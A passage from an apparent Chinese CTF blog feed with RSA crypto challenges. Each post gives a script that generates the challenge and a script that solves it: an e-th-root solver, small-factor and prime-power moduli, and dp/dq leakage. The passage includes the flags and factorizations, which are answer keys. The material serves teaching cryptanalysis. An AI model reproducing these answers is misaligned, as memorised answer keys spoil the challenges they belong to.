 i <span class="token operator">=</span> <span class="token number">1</span>    j <span class="token operator">=</span> <span class="token number">1</span>    t1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    t2 <span class="token operator">=</span> invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token keyword">for</span> mp1 <span class="token keyword">in</span> mp<span class="token punctuation">:</span>        <span class="token keyword">for</span> mq1 <span class="token keyword">in</span> mq<span class="token punctuation">:</span>            j <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> j <span class="token operator">%</span> <span class="token number">1000000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token punctuation">(</span>mp1<span class="token operator">*</span>t1<span class="token operator">*</span>q<span class="token operator">+</span>mq1<span class="token operator">*</span>t2<span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>            <span class="token keyword">if</span> check<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'NCTF'</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">ALL_ROOT2</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># use function set() and .add() ensure that the generated elements are not repeated</span>    li <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span> <span class="token operator">&lt;</span> r<span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> powmod<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>r<span class="token punctuation">,</span> q<span class="token punctuation">)</span>        li<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">return</span> li<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span>    p <span class="token operator">=</span> <span class="token number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span>    q <span class="token operator">=</span> <span class="token number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span>    e <span class="token operator">=</span> <span class="token number">0x1337</span>    cp <span class="token operator">=</span> c <span class="token operator">%</span> p    cq <span class="token operator">=</span> c <span class="token operator">%</span> q    mp <span class="token operator">=</span> AMM_rth<span class="token punctuation">(</span>cp<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    mq <span class="token operator">=</span> AMM_rth<span class="token punctuation">(</span>cq<span class="token punctuation">,</span> e<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    rt1 <span class="token operator">=</span> ALL_ROOT2<span class="token punctuation">(</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    rt2 <span class="token operator">=</span> ALL_ROOT2<span class="token punctuation">(</span>e<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    amp <span class="token operator">=</span> ALL_Solution<span class="token punctuation">(</span>mp<span class="token punctuation">,</span> p<span class="token punctuation">,</span> rt1<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    amq <span class="token operator">=</span> ALL_Solution<span class="token punctuation">(</span>mq<span class="token punctuation">,</span> q<span class="token punctuation">,</span> rt2<span class="token punctuation">,</span> cq<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    calc<span class="token punctuation">(</span>amp<span class="token punctuation">,</span> amq<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token comment">#NCTF&#123;T4k31ng_Ox1337_r00t_1s_n0t_th4t_34sy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N分解三个素数</title>
      <link href="/2023/01/14/N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/"/>
      <url>/2023/01/14/N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token comment">#生成随机素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>r<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>m<span class="token operator">=</span><span class="token string">"flag&#123;20d6e2da95dcc1fa5f5432a436c4be18&#125;"</span><span class="token comment">#字符串转数字</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token operator">*</span>rphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#求逆元</span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2n<span class="token operator">=</span> <span class="token number">145019079329431335397614962361328380657791588724922798973663969211116220115770245475920263239995612730754707053842643157419631306217775476295468921323722072358718740419891343</span>e<span class="token operator">=</span> <span class="token number">65537</span>c<span class="token operator">=</span> <span class="token number">140685916068372840188594810951725120856549500572531415145851334100894172238220723655155392437389265779142744297662199397338128573434156637005620163707528325151303620546345193</span><span class="token comment">#分解n</span><span class="token comment">#yafu-x64.exe  factor()</span>p<span class="token operator">=</span><span class="token number">3744386671</span>q <span class="token operator">=</span><span class="token number">3635915567</span>r <span class="token operator">=</span><span class="token number">10651987877533772188440205268385723681224651777384121120926977791191426755882566107618206306815183484369276527316840499421776849406225472400639701281788399</span>phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n是p的r次方</title>
      <link href="/2023/01/14/n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/"/>
      <url>/2023/01/14/n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token comment">#生成随机素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>m<span class="token operator">=</span><span class="token string">"flag&#123;de8c3ea714f7f780185924d473997bcb&#125;"</span><span class="token comment">#字符串转数字</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">4</span>phi_n<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">4</span><span class="token operator">-</span>p<span class="token operator">**</span><span class="token number">3</span><span class="token comment">#求逆元</span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum <span class="token keyword">import</span> gmpy2 n<span class="token operator">=</span> <span class="token number">23219089633250510580388184338893261190159425274266091829251069678345101374315005119889075848991325948461687799542168350589180122396501651434531030343667226410506241902501479054317717625217008857112114881864252928341340770771920275461651508679148124345837511394681152499950625703121385320234450147885925563601</span> e<span class="token operator">=</span> <span class="token number">65537</span> c<span class="token operator">=</span> <span class="token number">4777659110099869449331032200405354033599223023041765916601886190091487314989244505694085724093454432510462782520998688417537643026221506529296297782026160739262075190691284018675189858368054339063575534858807322887095235742287437139426799368719305846674897884286541494038433345483824310623372192122891409065</span> <span class="token comment">#分解n #yafu-x64.exe factor() p=69416273731307471601239913553838998413594935515871627319658832112504691596643 phi_n=p**4-p**3 </span><span class="token comment">#求逆元 </span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span> m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment">#数字转字节，转字符串 </span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dp,dq</title>
      <link href="/2023/01/14/dp-dq/"/>
      <url>/2023/01/14/dp-dq/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> string<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">put_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 字符串列表</span>    a <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> a<span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">r"flag&#123;%s&#125;"</span><span class="token operator">%</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> flag<span class="token comment">#生成素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>dp<span class="token operator">=</span>d<span class="token operator">%</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>dq<span class="token operator">=</span>d<span class="token operator">%</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>m<span class="token operator">=</span>put_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qc<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p="</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q="</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"dq="</span><span class="token punctuation">,</span>dq<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"dp="</span><span class="token punctuation">,</span>dp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    InvQ <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> dq<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>InvQ<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token operator">=</span> <span class="token number">160332148422085773419118366054725936852233416334843123745197905865814122767542980683547268180832158164485150298039693727719040683372172258525148659296087240380682418673910965969383538696724039000114078510939033236731476700182949760779821042982194738324421029616780752077145649691266297077244661585947836997447</span>q<span class="token operator">=</span> <span class="token number">148424511925430832355285085986622242653116164650119278601839811809456838348201308360579207172541711367335049779204390510911294031319604192881139002646252381246691575112024047502962776542023275076827456857946499013733968522162634588753330857821421229306405469212854327011240808908334404955299250060931240865821</span>dq<span class="token operator">=</span> <span class="token number">46499718919891753512042256824043332562579628188599554881257534157373206051013462063558177543473555667701042801266834703603013397791386747764400964376350060145521940586234916815399419075649204020285050341140996959732454059493770135591854817473937175643058380668604376797759987312600851466228301604453060674993</span>dp<span class="token operator">=</span> <span class="token number">142333710655003285129381975633061553108365353347897720974344479656881847851071160049571693284111493690735707224010091720382284617217647771503015838348510851051285580945849520119912938971503190396671148935203517916795662212439446680229030750273953490024181996476865040448118374338738013091140796970725623029913</span>c<span class="token operator">=</span> <span class="token number">19717919131356145411002342007533511479254120775597684622452661875292805564648015749422307039514664862428413419529876049533096947970606477676695854787457286807502628964582922773374784879459806551819337741730331777937597915727889640104583136339578788518904647309084873362461758500783634423921343109980901514994298280728150961559886893338458119937441920391275957965781890308011172861718172757876950159723089326843019779174406022143147201642738466470809603008292152193968160973116769118512212438656127645018486302418482079051867180606083540035964208124143457540388206274742292869004756069240519187723267661857029470809099</span>decrypt<span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dp泄露</title>
      <link href="/2023/01/14/dp%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/01/14/dp%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h2><h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> string<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">put_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 字符串列表</span>    a <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> a<span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">r"flag&#123;%s&#125;"</span><span class="token operator">%</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> flag<span class="token comment">#生成素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>dp<span class="token operator">=</span>d<span class="token operator">%</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>m<span class="token operator">=</span>put_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qc<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"dp="</span><span class="token punctuation">,</span>dp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/01/14/dp%E6%B3%84%E9%9C%B2/MyBlog\source_posts\dp泄露.assets\1665236983955.png" alt="1665236983955"></p><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2n<span class="token operator">=</span> <span class="token number">15490329974794812647207350945845678224681604428642220566423366180973839697096441619340018253695472604335938643849069014103520861300713053955205392905536446156153192076633656788424185734898016745641378430506574498111680248029123341493733599302123100131134215957579162168779228208387783035893621162016993340603475960735061572761512755519616410410615413820180757126318567325096339342686253738778178380191340135516056457473854126752188188261914055391966730674861017432904735293451031131827880629989269835970170038295168392442835892108945315382078025510997711116410638765048886317360842562784200384045644008789130370444983</span>e<span class="token operator">=</span> <span class="token number">65537</span>dp<span class="token operator">=</span> <span class="token number">92421914522602787051376990773545034723755500322946639408033747477366773088952064561196722681757327451210117825346237003629597066505402384880737033044776720946764227004188812078355462119361676746112866393394866072449432108301690846327127554699521545673830710939287951837844749172755258073462248214264511338895</span>c<span class="token operator">=</span> <span class="token 